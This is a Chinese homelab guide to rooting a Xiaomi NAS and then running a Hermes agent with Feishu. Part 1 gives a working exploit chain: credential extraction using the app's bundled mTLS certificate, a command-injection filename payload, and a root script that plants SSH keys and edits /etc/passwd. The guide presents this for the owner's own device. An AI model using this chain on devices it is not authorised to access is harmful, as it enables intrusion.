# 小米智能存储 (Xiaomi NAS) — 获取 Root SSH + 部署 Hermes + 接入飞书

在小米智能存储（minas / RP05 / Realtek RTD1619B / aarch64 / Yocto 5.0.3）上完成三件事的完整实操记录：

1. **获取 Root SSH**：通过 WebDAV + 客户端证书（mTLS）拿到凭据，上传脚本并用命令注入触发，开启 dropbear，并完成安全加固。
2. **部署 Hermes Agent**：用设备自带的 Docker 跑 `ghcr.io/nesquena/hermes-webui`（Web UI + 浏览器内嵌 TUI）。
3. **接入飞书**：启用 Hermes Gateway 的 `feishu` 适配器（WebSocket 长连接），即可在飞书里直接和 Hermes 对话。

> ⚠️ **前置声明**：整个过程会改动系统服务、`/etc/passwd`、写 RPMB 硬件位（固件级开关）。**仅限本人拥有或已明确授权的设备**，操作可能失去官方保修，固件升级会覆盖部分改动。请先备份重要数据。
>
> 🔒 **脱敏说明**：文中的 `NAS_IP`、`CN`、`<USER>`、`<OPEN_ID>`、API Key / App Secret / SSH 公私钥均已替换为占位符。**请全部换成你自己的值**，切勿把真实密钥提交到公开仓库。

---

## 目录

- [0. 前置变量](#0-前置变量)
- [Part 1：获取 Root SSH](#part-1获取-root-ssh)
- [Part 2：用 Docker 部署 Hermes](#part-2用-docker-部署-hermes)
- [Part 3：配置飞书 channel](#part-3配置飞书-channel)
- [附：常见坑与恢复](#附常见坑与恢复)

---

## 0. 前置变量

| 变量 | 说明 |
|------|------|
| `<NAS_IP>` | NAS 局域网 IP，路由器后台 / 管理页可见 |
| `<CN>` | 设备证书域名，形如 `nas.<uid>.<random>.0`，由设备 443 证书 CN 得到 |
| `<USER>` | WebDAV 用户名，形如 `u<uid>`，来自 `get_pool_info` |
| `<OPEN_ID>` | 飞书用户 open_id，用于白名单 |

---

## Part 1：获取 Root SSH

### 1.1 定位客户端证书

**macOS 版「小米智能存储」客户端**会把 mTLS 客户端证书打包在应用内，无需导出：

```text
/Applications/小米智能存储.app/Contents/Resources/extraResources/cert/
  ├─ ca_chain.pem
  ├─ <UID>_<SERIAL>_cert.pem
  ├─ <UID>_<SERIAL>_private_key.pem
  └─ <UID>_<SERIAL>_csr.pem
```

验证：

```bash
openssl x509 -in "<证书路径>/<UID>_<SERIAL>_cert.pem" -noout -subject -issuer
# subject 形如: CN=nas.<uid>.<random>.0   issuer: O=MIOT CENTRAL GATEWAY
```

从 NAS 的 443 端口抓设备证书域名 `<CN>`：

```bash
echo | openssl s_client -connect <NAS_IP>:443 2>/dev/null | openssl x509 -noout -subject
```

### 1.2 macOS 的关键坑：curl 不支持 Ed25519 客户端证书

小米的客户端证书公钥是 **Ed25519**。macOS 自带 `curl`（LibreSSL / SecureTransport）**不支持 Ed25519 客户端证书**，执行 `curl --cert cert.pem --key key.pem ...` 会报 `unsupported algorithm`。

**解决**：用 Python `ssl`（走机器上的 OpenSSL 3.x）做 mTLS。见仓库 `scripts/enable-ssh-macos.py`（已脱敏，替换 `<NAS_IP>`）。

### 1.3 用 mTLS 拿 WebDAV 凭据

对 NAS 的 443 端口发起 mTLS 请求（SNI = `<CN>`，使用客户端证书 + `ca_chain.pem` 校验服务端），调用：

```text
POST /cgi-bin/luci/filemgr/get_pool_info   body: {}
```

响应里 `data.webDAV` 给出 `username`（形如 `u<uid>`）、`password`、`port=5000`。

### 1.4 上传 enable-ssh.sh 并命令注入触发

把脚本 PUT 到 WebDAV：

```text
PUT https://<CN>:5000/pool0/data/enable-ssh.sh
Authorization: Basic <username>:<password>   （并带 mTLS 客户端证书）
```

**注意：只上传不会自动执行**，还需要用命令注入文件名触发（把 `/` 用 `\57` 转义构造）：

```text
GET /pool0/video/__X2";sh $(printf '\57nas\57pool0\57<USER>\57data\57enable-ssh.sh');"__.ts
```

`enable-ssh.sh` 的核心动作（见 `scripts/enable-ssh-macos.py` 内联）：

```sh
#!/bin/sh
[ ! -f /etc/passwd.bak ] && cp /etc/passwd /etc/passwd.bak
mkdir -p /home/rootx/.ssh
echo "<你的公钥>" > /home/rootx/.ssh/authorized_keys
chmod 700 /home/rootx/.ssh && chmod 600 /home/rootx/.ssh/authorized_keys
sed -i 's|:/root:|:/home/rootx:|' /etc/passwd
echo 'DROPBEAR_EXTRA_ARGS=" -s"' > /etc/default/dropbear
usermod -s /bin/sh root
systemctl enable dropbear.socket && systemctl start dropbear.socket
mitee_tool rpmb set ssh_en true
touch /nas/pool0/<USER>/data/SUCCESS
rm -f /nas/pool0/<USER>/data/enable-ssh.sh
```

### 1.5 验证 Root SSH

```bash
ssh -i ~/.ssh/id_ed25519 root@<NAS_IP> id
# uid=0(root) gid=0(root) ...
```

> 关键点：`/root` 是**只读 erofs 分区**，所以必须把 root 的 HOME 迁到可写的 `/home/rootx`，authorized_keys 才能真正被 dropbear 读到——否则"看起来配了 key，实际不生效"。

### 1.6 安全加固：空密码 / 只读分区

出厂状态下 **root 密码为空**，且 dropbear 默认可能带 `-B`（允许空密码）。务必：

```bash
# 1) 禁用空密码/密码登录（-s）
echo 'DROPBEAR_EXTRA_ARGS=" -s"' > /etc/default/dropbear
# 2) 设非空 root 密码（纵深防御）
printf 'root:<强密码>\n' | chpasswd
# 3) 确认只提供 publickey
ssh -o PreferredAuthentications=none -o BatchMode=yes root@<NAS_IP> exit
# 期望: Permission denied (publickey)   → 无 password 通道
```

**固件升级会重置** `/etc/passwd`（HOME 回 `/root`）和 `/etc/default/dropbear`（丢 `-s`）。写一个恢复脚本 `scripts/fix-ssh-home.sh` 放到可写分区 `/data/`，升级后执行一次即可。

---

## Part 2：用 Docker 部署 Hermes

设备自带 Docker（daemon `iptables:false`），CLI 在 `/data/docker/docker`。

### 2.2 拉取镜像：国内网络怎么破

直连 Docker Hub / ghcr 在 CN 很慢。两条路：

**方案 A：国内 ghcr 镜像站**（直接，若可达）

```bash
/data/docker/docker pull --platform linux/arm64 ghcr.nju.edu.cn/nesquena/hermes-webui:latest
```

**方案 B：Mac 中转再 docker load**（最稳）

```bash
# Mac 上（有代理则更稳）：用 crane 拉成 tar
HTTPS_PROXY=http://127.0.0.1:7897 crane pull --platform linux/arm64 \
  ghcr.io/nesquena/hermes-webui:latest /tmp/hermes-webui.tar
# 传到 NAS 并 load
scp /tmp/hermes-webui.tar root@<NAS_IP>:/data/hermes-webui.tar
ssh root@<NAS_IP> '/data/docker/docker load -i /data/hermes-webui.tar'
```

> 该镜像是 `Web UI + Hermes 运行时` 单容器（arm64 官方多架构），自带 `/tui`（浏览器内嵌 TUI）。

### 2.3 启动 WebUI 容器

`iptables:false` 会让默认 bridge + `-p` 端口映射不稳，**用 `--network host`** 最省事。持久化数据放 `/data/hermes`（别放 `/nas/pool0` 那个 fuse，bind mount 易出问题）。

```bash
mkdir -p /data/hermes/home /data/hermes/workspace && chmod 777 /data/hermes/home /data/hermes/workspace
/data/docker/docker run -d --name hermes-webui --network host --restart unless-stopped \
  -e HERMES_WEBUI_HOST=0.0.0.0 -e HERMES_WEBUI_PORT=8787 \
  -e HERMES_WEBUI_STATE_DIR=/home/hermeswebui/.hermes/webui \
  -v /data/hermes/home:/home/hermeswebui/.hermes \
  -v /data/hermes/workspace:/workspace \
  ghcr.io/nesquena/hermes-webui:latest
```

首次启动会 pip 装依赖（PyPI 在 CN 慢），用清华源：

```bash
/data/docker/docker exec -e PIP_INDEX_URL=https://pypi.tuna.tsinghua.edu.cn/simple \
  -e UV_INDEX_URL=https://pypi.tuna.tsinghua.edu.cn/simple hermes-webui \
  /app/venv/bin/pip install "hermes-agent[feishu]"
```

访问：`http://<NAS_IP>:8787`

### 2.4 配置 DeepSeek 模型

容器内 `~/.hermes/config.yaml`（挂载在 `/data/hermes/home/config.yaml`）：

```yaml
model:
  default: <你的模型名，如 deepseek-v4-flash-vision-exp>
  provider: custom
  base_url: https://api.deepseek.com/v1
  api_key: <DEEPSEEK_API_KEY>
```

API Key 放同目录 `.env`：`DEEPSEEK_API_KEY=<key>`（`chmod 600`）。

---

## Part 3：配置飞书 channel

### 3.1 飞书侧：创建应用 / 机器人 / 长连接

1. 打开 [飞书开放平台](https://open.feishu.cn)，登录后**创建企业自建应用**。
2. 应用详情 → **添加应用能力 → 机器人**，启用。
3. **事件与回调 → 订阅方式选「使用长连接接收事件」**（WebSocket）。NAS 在局域网、无公网 URL，所以**必须长连接**，不要用 Webhook。
4. 勾选读消息权限（`im:message`、`im:message.p2p_msg`、`im:message.group_at_msg`），订阅 `im.message.receive_v1`。
5. **凭证与基础信息**：复制 **App ID** 和 **App Secret**。
6. **版本管理与发布**：发布后机器人才能被 @。

### 3.2 容器里装 feishu 适配器并跑 Gateway

`hermes-agent[feishu]` 已装进 WebUI 容器的 venv；把它固化成一个新镜像，再单独跑 gateway 容器：

```bash
D=/data/docker/docker
$D commit hermes-webui hermes:full

# 让容器用户 1024 以你的 NAS 用户组（gid=u<uid> 对应组）运行，才能读照片 pool
$D run -d --name hermes-gateway --network host --restart unless-stopped \
  --user 1024:<NAS_USER_GID> \
  -e HERMES_HOME=/home/hermeswebui/.hermes \
  -v /data/hermes/home:/home/hermeswebui/.hermes \
  -v /nas/pool0/<USER>/data:/nas/pool \
  hermes:full /app/venv/bin/hermes gateway run
```

共享 `~/.hermes/.env`（同上目录）追加飞书凭证：

```text
FEISHU_APP_ID=cli_xxxx
FEISHU_APP_SECRET=<SECRET>
FEISHU_DOMAIN=feishu
FEISHU_CONNECTION_MODE=websocket
FEISHU_ALLOWED_USERS=ou_xxxx
```

gateway 起来后日志出现 `[Lark] connected to wss://msg-frontier.feishu.cn/ws/v2...` 即成功。

### 3.3 配对审批访问控制

首次 @ 机器人会生成配对码，审批后即可使用：

```bash
docker exec --user 1024:<NAS_USER_GID> -e HERMES_HOME=/home/hermeswebui/.hermes \
  hermes-gateway /app/venv/bin/hermes pairing approve feishu <配对码>
```

---

## 附：常见坑与恢复

| 现象 | 原因 / 处理 |
|------|------|
| `PermissionError: gateway.lock` | 属主不匹配。容器以非 root 跑时，`chown -R 1024:1024 /data/hermes/home` 并清掉 root 属主的 `*.lock` |
| 容器读不到 NAS 照片 | 没挂 pool，或容器用户不在 NAS 用户组。用 `--user 1024:<NAS_USER_GID>` 并加 `-v /nas/pool0/<USER>/data:/nas/pool` |
| PyPI / Docker Hub 慢 | 用清华源 / ghcr.nju.edu.cn，或用 Mac crane 中转 |
| 固件升级后 SSH key 失效 | 执行 `sh /data/fix-ssh-home.sh`（恢复 HOME + authorized_keys + `-s`） |
| 空密码仍能登录 | `/etc/default/dropbear` 丢了 `-s`，重新写入并重启 dropbear |

## 参考脚本

- [`scripts/enable-ssh-macos.py`](scripts/enable-ssh-macos.py) — macOS 端 mTLS 取凭据 + 上传触发，全流程脚本（替换 `<NAS_IP>`）。
- [`scripts/fix-ssh-home.sh`](scripts/fix-ssh-home.sh) — 固件升级后恢复 SSH 的加固脚本。

---

> 本仓库为个人 HomeLab 研究记录，仅供学习与自有设备管理。请勿用于越权访问他人设备。文中所有真实凭据均已脱敏。
